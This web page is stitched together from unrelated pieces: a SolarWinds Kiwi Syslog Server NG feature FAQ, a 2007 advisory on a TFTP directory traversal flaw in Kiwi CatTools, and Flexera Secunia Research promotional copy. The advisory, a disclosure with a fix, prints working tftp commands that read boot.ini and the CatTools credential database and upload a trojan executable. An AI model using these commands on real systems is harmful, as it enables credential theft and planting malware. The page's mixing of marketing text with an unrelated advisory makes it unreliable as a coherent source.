## Feature overview

### Syslog message monitoring

Easily collect, manage, and archive syslog messages from your network devices.

View Less![Centralize your syslog messages](https://images.contentstack.io/v3/assets/blt28ff6c4a2cf43126/bltac0e7b32cf896f7a/672a8b2ac7d48933a53e3f66/kss-ng-event-list.png?auto=webp&disable=upscale&width=3840&quality=75)
### Centralize your syslog messages

Accessing and searching all syslog messages in one syslog server can make a difference in hours of network troubleshooting, as it enables you to find the root cause of an issue and resolve network problems much faster as opposed to inspecting syslog messages device by device in their individual logging consoles.

## Log Management shouldn’t be hard.

Do you find yourself asking…

* How can I centralize and simplify my log management?
* How can I identify a network issue as soon as possible?
* Can Kiwi Syslog Server NG help automate my response to certain events?
* How can I make sure all my logs are stored and archived for regulatory compliance?
* Does Kiwi Syslog Server NG include web access?
* How can I effectively search in logs when investigating a network issue?
* Can Kiwi Syslog Server NG collect Windows events?
### How can I centralize and simplify my log management?

Each device on your network creates hundreds of logs every minute. Combing through them on a system-by-system basis is next to impossible. With SolarWinds® Kiwi Syslog® Server NG, you can manage syslog messages and SNMP traps from network devices, including Linux, UNIX, and Windows systems from a single console.

[**Learn More**](https://www.solarwinds.com/kiwi-syslog-server/use-cases/log-collection)

### How can I identify a network issue as soon as possible?

Security threats are constantly lurking, but the only way to stay ahead of them is by knowing when and where they occur in the first place. The Kiwi Syslog Server software can help you get an almost real-time alert indicating a problem with your network device or server. In the Kiwi® management console, you can easily inspect log messages from your devices and troubleshoot faster compared to inspecting your logs device by device.

[**Learn More**](https://www.solarwinds.com/kiwi-syslog-server/use-cases/syslog-monitoring-software)

### Can Kiwi Syslog Server NG help automate my response to certain events?

Your ability to quickly respond to IT events can mean the difference between letting an issue run rampant or stopping it in its tracks. With Kiwi Syslog Server NG, you can trigger email alerts, run scripts, log to file or ODBC database, forward messages, and apply other actions to automatically respond to incoming syslog messages.

[**Learn More**](https://www.solarwinds.com/kiwi-syslog-server/use-cases/syslog-monitoring-software)

### How can I make sure all my logs are stored and archived for regulatory compliance?

Log collection and retention are staples among compliance frameworks. Missing the mark on this requirement could negatively impact your business. With the Kiwi Syslog Server software, you can schedule automated log archival and cleanup to help you demonstrate compliance with SOX, HIPAA, PCI DSS, etc.

[**Learn More**](https://www.solarwinds.com/kiwi-syslog-server/use-cases/log-collection)

### Does Kiwi Syslog Server NG include web access?

Yes, it does. As an IT pro, your work travels with you. The ability to monitor and manage logs should be untethered too. Kiwi Syslog Server NG is a web-based application so you can view syslog data anywhere.

### How can I effectively search in logs when investigating a network issue?

Reviewing whole groups of log data for issues or signs of malicious behavior is like searching for a needle in a haystack. With Kiwi Syslog Server NG, you can perform advanced message filtering by host name, host IP address, priority, or time of day.

[**Learn More**](https://www.solarwinds.com/kiwi-syslog-server/use-cases/network-troubleshooting)

### Can Kiwi Syslog Server NG collect Windows events?

Yes, it can. With a free SolarWinds tool [Event Log Forwarder for Windows](https://www.solarwinds.com/free-tools/event-log-forwarder-for-windows), you can easily forward Windows events to your syslog server to take further action. Quickly specify and automatically send events from workstations and servers, export event data from Windows servers and workstations, and specify events to forward by source, type ID, and keywords. Forward events to external systems to alert, store, and audit activity. Send events to multiple servers over UDP or TCP.

 TFTP directory traversal in Kiwi CatTools
Application : Kiwi CatTools prior to 3.2.0 beta
Release Date : 8 February 2007
Author : Nicob <nicob at nicob.net>
Product :
=========
http://www.kiwisyslog.com/cattools-info.php :
"Kiwi CatTools is a freeware application that provides automated device
configuration management on routers, switches and firewalls."
A built-in TFTP server exists and a "encrypted device database" contains
IP addresses, logins and passwords for each configured device.
Vunerability :
==============
TFTP directory traversal :
tftp -i 10.11.12.13 GET a//..//..//..//..//..//boot.ini
tftp -i 10.11.12.13 PUT foo.exe a//..//trojan.exe
Note : the device database is only protected by a reversible encoding
and can be remotely accessed with "GET a//..//..//kiwidb-cattools.kdb".
Solution :
==========
Upgrade to version 3.2.0 beta or newer.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
